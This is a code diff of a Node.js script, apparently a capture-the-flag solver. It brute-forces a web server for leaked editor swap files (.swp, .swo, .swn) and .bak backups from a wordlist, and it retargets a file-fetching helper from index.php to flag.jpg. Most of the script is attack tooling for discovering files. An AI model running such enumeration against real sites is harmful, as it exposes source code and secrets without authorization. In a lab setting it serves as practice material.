@@ -1,5 +1,8 @@
+const fs = require('fs')
+const path = require('path')
 const got = require('got')
 const cheerio = require('cheerio')
+const flatten = require('just-flatten-it')
 
 const base64 = {
   encode (str, encoding = 'utf8') {
@@ -49,7 +52,7 @@ async function fetch (filename) {
 
 async function main () {
   try {
-    const result = await fetch('index.php')
+    const result = await fetch('flag.jpg')
     console.log(JSON.stringify(result, null, 2))
     console.log(result.content)
   } catch (error) {
@@ -57,4 +60,29 @@ async function main () {
   }
 }
 
-main()
+async function debug () {
+  const getFilenameFunctions = [
+    (n) => `.${n}.swp`,
+    (n) => `.${n}.swo`,
+    (n) => `.${n}.swn`,
+    (n) => `${n}.bak`,
+    (n) => n,
+  ]
+  const filenames = fs.readFileSync(path.resolve(__dirname, './dict.txt'), 'utf8')
+    .replace(/\r\n/g, '\n')
+    .split('\n')
+
+  try {
+    const results = flatten(await Promise.all(filenames.map((name) => 
+      Promise.all(getFilenameFunctions.map((getFilename) =>
+        fetch(getFilename(name))
+      ))
+    )))
+    const availables = results.filter(({ content }) => content)
+    console.log(availables)
+    } catch (error) {
+      console.error(`Error: ${error.message}`)
+    }
+}
+
+debug()
